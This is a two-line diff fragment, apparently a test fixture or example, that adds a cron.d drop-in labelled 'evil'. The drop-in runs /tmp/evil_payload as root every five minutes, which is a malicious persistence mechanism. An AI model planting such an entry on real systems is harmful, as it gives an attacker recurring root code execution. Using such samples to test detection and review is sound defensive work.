@@ -1,0 +1,2 @@
+# evil cron.d drop-in
+*/5 * * * * root /tmp/evil_payload
